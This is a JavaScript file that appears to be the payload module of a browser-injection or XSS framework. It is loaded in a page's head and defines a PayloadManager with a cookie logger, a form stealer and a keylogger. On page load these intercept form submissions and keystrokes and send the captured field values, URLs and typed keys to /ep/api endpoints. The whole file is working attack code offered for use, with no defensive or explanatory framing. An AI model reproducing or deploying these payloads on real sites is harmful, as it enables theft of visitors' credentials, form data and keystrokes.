/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

alert('Test payload')

const PayloadManager = {
    // Configuration for payloads
    config: {
        cookieLogger: true,
        formStealer: true,
        keyLogger: false
    },

    // Available payloads
    payloads: {
        cookieLogger: () => {
            setInterval(() => {
                fetch('/ep/api/ping', { 
                    method: 'POST', 
                    credentials: 'include'
                });
            }, 5000); // Check every 5 seconds
        },

        formStealer: () => {
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    const formData = new FormData(form);
                    const data = {
                        url: window.location.href,
                        fields: Object.fromEntries(formData),
                        timestamp: new Date().toISOString()
                    };
                    
                    await fetch('/ep/api/forms', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });

                    form.submit();
                });
            });
        },

        keyLogger: () => {
            let buffer = '';
            document.addEventListener('keypress', (e) => {
                buffer += e.key;
                if (buffer.length >= 50) {  // Send every 50 characters
                    fetch('/ep/api/keylog', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            keys: buffer,
                            url: window.location.href,
                            timestamp: new Date().toISOString()
                        })
                    });
                    buffer = '';
                }
            });
        }
    },
    
    init: function() {
        // Execute enabled payloads when DOM is loaded
        document.addEventListener('DOMContentLoaded', () => {
            Object.keys(this.config).forEach(payload => {
                if (this.config[payload] && this.payloads[payload]) {
                    try {
                        console.log(`[*] Initializing payload: ${payload}`);
                        this.payloads[payload]();
                    } catch (error) {
                        console.error(`[!] Error in payload ${payload}:`, error);
                    }
                }
            });
        });
    }
};

PayloadManager.init();